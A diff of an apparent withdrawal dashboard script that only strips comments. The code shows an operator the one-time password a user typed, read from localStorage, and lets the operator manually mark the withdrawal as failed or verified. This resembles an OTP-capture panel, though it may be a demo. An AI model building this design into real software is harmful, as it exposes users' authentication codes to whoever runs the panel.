@@ -141,7 +141,6 @@ function render() {
     withdrawRows.innerHTML = empty(7);
   }
   
-  // Check if user entered OTP
   var userOtp = localStorage.getItem('user_entered_otp');
   if (userOtp && userOtp !== lastOtp) {
     lastOtp = userOtp;
@@ -153,7 +152,6 @@ function render() {
     document.getElementById('otpStatus').style.color = '#ff9800';
   }
   
-  // Check result status
   var result = localStorage.getItem('otp_result');
   if (result === 'failed') {
     document.getElementById('otpStatus').textContent = '❌ OTP Failed! User notified.';
@@ -194,7 +192,6 @@ function sendOTPFailed() {
     return;
   }
   
-  // Update withdrawal status to Failed
   var all = getData();
   if (all.length > 0) {
     var latest = all[0];
@@ -205,7 +202,6 @@ function sendOTPFailed() {
     }
   }
   
-  // Send failed to user
   localStorage.setItem('otp_result', 'failed');
   document.getElementById('userOtpStatus').textContent = '❌ OTP Failed!';
   document.getElementById('userOtpStatus').style.color = '#dc3545';
@@ -223,7 +219,6 @@ function sendOTPSuccess() {
     return;
   }
   
-  // Update withdrawal status to Verified
   var all = getData();
   if (all.length > 0) {
     var latest = all[0];
@@ -234,7 +229,6 @@ function sendOTPSuccess() {
     }
   }
   
-  // Send success to user
   localStorage.setItem('otp_result', 'success');
   document.getElementById('userOtpStatus').textContent = '✅ OTP Successful!';
   document.getElementById('userOtpStatus').style.color = '#28a745';
